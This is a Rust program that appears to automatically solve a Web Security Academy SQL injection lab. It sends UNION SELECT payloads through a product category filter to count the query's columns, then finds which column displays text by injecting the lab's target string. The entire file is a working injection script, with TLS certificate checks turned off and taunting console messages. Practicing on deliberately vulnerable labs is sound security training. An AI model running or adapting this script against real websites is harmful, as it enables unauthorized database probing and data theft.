use reqwest::Client;
use scraper::{Html, Selector};
use std::error::Error;

fn check_internal_server_error(html_text: &str) -> bool {
    let document = Html::parse_document(html_text);
    let sel = Selector::parse(r#"p[class="is-warning"]"#).unwrap();
    let text = document
        .select(&sel)
        .next()
        .map(|el| el.text().collect::<Vec<_>>().join(" ").trim().to_string());
    println!("{:?}", &text);

    match text {
        Some(ref t) if t == "Internal Server Error" => false,
        Some(_) => true,
        None => true,
    }
}

fn fetch_string_literal(html_text: &str) -> String {
    let document = Html::parse_document(html_text);
    let sel = Selector::parse("p#hint").unwrap();
    if let Some(string_value) = document.select(&sel).next() {
        let string = string_value.text().collect::<String>();
        let parts: Vec<&str> = string.split('\'').collect();
        if parts.len() > 1 {
            println!("The target string is: {}", parts[1]);
            return parts[1].to_string();
        }
    }
    String::new()
}

fn string_fetched_final_request(html_text: &str) -> Option<String> {
    let document = Html::parse_document(html_text);
    let sel = Selector::parse("tr").unwrap();
    if let Some(tr_tag) = document.select(&sel).next() {
        let th_selector = Selector::parse("th").unwrap();
        if let Some(th_tag) = tr_tag.select(&th_selector).next() {
            return Some(th_tag.text().collect::<String>().trim().to_string());
        }
    }
    None
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let host = "https://0a5b007b047718ab815c665300450062.web-security-academy.net";
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .cookie_store(true)
        .build()?;
    
    let product_url = format!("{}/filter?category=", host);
    let null_value = "null";
    let comment = "--";
    let mut payload1 = format!("{}'UNION select {}", product_url, null_value);
    let comma = ",";
    let mut i = false;

    while i == false {
        let resp_text = client
            .get(format!("{}{}", payload1, comment))
            .send()
            .await?
            .text()
            .await?;
        let answer = check_internal_server_error(&resp_text);
        println!("executed payload: {} ", format!("{}{}", payload1, comment));

        if answer == false {
            payload1 = payload1 + comma + null_value;
        } else {
            i = true;
        }
    }

    let resp_text_new = client
        .get(format!("{}{}", payload1, comment))
        .send()
        .await?
        .text()
        .await?;
    
    if check_internal_server_error(&resp_text_new) {
        let home_text = client.get(host).send().await?.text().await?;
        let s = fetch_string_literal(&home_text);
        let s_no_quotes = s.clone();
        let s_quoted = format!("'{}'", s);
        
        let parts: Vec<&str> = payload1.split("null").collect();
        let mut payloads = Vec::new();
        
        for i in 1..parts.len() {
            let before = parts[..i].join("null");
            let after = parts[i..].join("null");
            let final_payload = format!("{}{}{}", before, s_quoted, after);
            payloads.push(final_payload);
        }
        
    for payload in payloads {
    let full_payload = format!("{}{}", payload, comment);
    println!("{}", full_payload);
    let resp = client.get(&full_payload).send().await?;

    if resp.status().as_u16() == 500 {
        println!("Status 500 - skipping");
        continue;
    }

    let resp_text = resp.text().await?;

    if let Some(fetched) = string_fetched_final_request(&resp_text) {
        println!("Fetched value: {}", fetched);
        println!("Target value: {}", s_no_quotes);
        if s_no_quotes == fetched {
            println!("[+] Lab Solved LESSGOOOOO");
            break;
        } else {
            println!("Try harder noob!");
        }
    } else {
        println!("No value fetched from response");
    }
}
    }

    Ok(())
}